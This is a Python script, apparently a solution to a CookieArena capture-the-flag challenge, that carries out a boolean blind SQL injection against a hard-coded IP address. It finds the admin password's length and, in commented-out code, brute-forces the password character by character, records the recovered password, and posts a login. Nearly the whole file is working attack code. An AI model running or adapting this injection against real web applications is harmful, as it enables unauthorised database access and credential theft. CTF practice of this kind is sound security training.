#Simple blind sql injection from CookieArena
import requests
host = "http://103.97.125.56:32580/"
param = "uid"
url = f"{host}?{param}="

####find length password
i=1
while True:
    query = f"admin' and (select length(upw) from users where uid='admin')={i}-- -"
    print(f"[+] Thu i = {i}")
    res = requests.get(url+query)
    if "exists" in res.text:
        length_pw = i
        print(f"\n[*] Do dai cua password: {length_pw}\n")
        break
    i+=1

####brute password
# password = ""
# for i in range(13):
#     characters = 'abcdefghijklmnopqrstuvwxyz0123456789_'
#     for c in characters:
#         query = f"admin' and (select substr(upw,{i+1},1) from users where uid='admin')='{c}'-- -"
#         print(f"[+] Testing {c}")
#         res = requests.get(url+query)
#         if "exists" in res.text:
#             password += c
#             print(f"\n[*] Ky tu thu {i+1} password: {c}\n")
#             break
# print(f"\n[*] Password found: {password}")

# password = "y0u_4r3_4dm1n"
# #post login
# burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://103.97.125.56:30253", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://103.97.125.56:30253/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
# burp0_data = {"username": "admin", "password": f"{password}"}
# res = requests.post(url, headers=burp0_headers, data=burp0_data)
# print(res.text)


# https://forum.cookiearena.org/t/web-simple-blind-sql-injection/161